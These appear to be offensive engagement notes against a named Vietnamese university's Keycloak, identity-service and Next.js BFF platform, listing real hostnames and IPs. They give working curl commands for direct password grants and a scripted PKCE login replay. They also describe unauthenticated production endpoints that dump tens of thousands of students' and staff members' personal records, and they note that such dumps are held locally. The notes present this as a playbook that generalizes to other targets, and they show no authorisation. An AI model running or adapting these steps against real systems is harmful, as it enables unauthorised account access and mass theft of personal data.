# VAU/VAA Engagement (2026-09) — Keycloak + Identity-Service + Next.js BFF Platform

Worked example from a Vietnamese university platform (Vietnam Aviation Academy, dual domains
`vau.edu.vn` + `vaa.edu.vn`). Pattern generalizes to any target running
Keycloak + a custom identity/JWT service + Next.js BFF apps.

## Asset map that worked (crt.sh returned NOTHING for the apex)

DNS brute of `dev-` prefixes on both domains found all 4 IPs:

| Host | IP | Notes |
|---|---|---|
| dev-hr.vau.edu.vn | 183.91.9.45 | Next.js HR app, /bff/* |
| dev-portal.vau.edu.vn | 183.91.9.45 | Next.js student portal |
| identity.vau.edu.vn + identity.vaa.edu.vn | 183.91.9.45 | Express identity-service (PROD too) |
| sso.vau.edu.vn | 183.91.9.45 | Keycloak prod realm vaa-platform |
| dev-sso.vau.edu.vn | 183.91.9.173 | Keycloak dev |
| dev-masterdata.vau.edu.vn | 183.91.9.173 | Next.js masterdata |
| lms.vau.edu.vn | 183.91.9.165 | Moodle |
| grafana.vau.edu.vn | 183.91.9.165 | Grafana |
| gitlab.vau.edu.vn | 115.79.45.218 | GitLab (sign_up = 200!) |
| keycloak.vau.edu.vn | cfargotunnel | cloudflared tunnel (dead externally) |

## Finding 1 — Keycloak admin-cli direct grant (dev AND prod)

```bash
curl -sk -X POST "https://sso.vau.edu.vn/realms/vaa-platform/protocol/openid-connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=admin-cli&username=<user>&password=<pw>&scope=openid"
```
- Returns access_token + refresh_token + id_token. userinfo shows realm roles
  (teacher/staff/student). admin REST (`/admin/realms/...`) still 403 for normal users —
  Direct Access Grants on admin-cli is the exposure, not console access.

## Finding 2 — Identity service unauth surface (PRODUCTION host)

`GET https://identity.vau.edu.vn/health` → `{"status":"healthy","mainDatabase":true,"hrmDatabase":true,"eduDatabase":true,"service":"vaa-identity-service"}`

`GET /api-docs` → Swagger UI; the spec is in `/api-docs/swagger-ui-init.js` (~100KB, NOT swagger.json).

Unauth endpoints from spec:
- `GET /sync/users-for-lms` → **38,988 users (7.2MB JSON)**: username, fullName, sourceId,
  userType (SV=student 37,698 / NS=staff 1,290) — PII mass dump.
- `GET /sync/semesters`, `/sync/class-sections-for-lms` → full academic DB dumps.
- `/admin/*` requires Bearer but accepts ANY valid JWT (no role check): `/admin/stats`,
  `/admin/oauth-clients` (full client list incl. scopes), `/admin/login-stats`
  (229,327 logins / 18,727 unique users), `/admin/security-alerts`.

## Finding 3 — Mobile password grant bypasses web-SSO protections

```bash
curl -sk -X POST "https://identity.vau.edu.vn/auth/oauth/direct/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"<user>","password":"<pw>","clientId":"vaa-mobile","deviceId":"x1","platform":"android"}'
```
- `vaa-mobile` is a public client (no secret) → password grant for ANY account
  (staff included) with no MFA/CAPTCHA/rate-limit/lockout observed.
- Token aud=vaa-mobile, iss=identity.vau.edu.vn. Refresh works via
  `POST /auth/oauth/direct/refresh {"refreshToken":...}`.
- Admin endpoints unlock with this normal-user token (Finding 2).

## Finding 4 — Next.js BFF PKCE replay (scriptable login)

Flow (needs cookies jar; Origin+Referer required on step 4):
1. `GET /bff/auth/login?state&codeChallenge&nonce` → 307 to KC (Location has rewritten state)
2. `GET <sso_url>` → parse form action (session_code/execution/tab_id/client_data)
3. `POST <form_action>` username/password → 302 `/auth/callback?code=<uuid>`
4. `POST /bff/auth/callback` JSON `{code,state,expectedState,codeVerifier,oidcNonce,returnUrl}`
   with `Origin` + `Referer` same-site headers → 403 `Nguồn yêu cầu không hợp lệ` without them
5. Sets vaa_hr_access_token/_refresh_token/_id_token/_csrf cookies → `/bff/v1/users` returns
   staff PII (email/phone/roles) — 415 users, but `page` param silently IGNORED (always page 1);
   single-record GET by UUID works for any id.

Gotchas:
- Session TTL ≈15 min; BFF throttle ≈5 logins → misleading `403 HR_ACCESS_NOT_GRANTED` for ~5 min
  (account NOT revoked — just wait).
- Student role = 401 on HR endpoints (server-enforced), and identity-service JWT ≠ Keycloak JWT
  (strict issuer/audience; don't cross-replay).

## Cleanup state
- Notes: /tmp/vau_hunt_notes.md; dumps: /tmp/sync_users.json (7.2MB), /tmp/vau_users_all.json
- Python helper: /tmp/hrm_session.py (login + api functions, reusable)
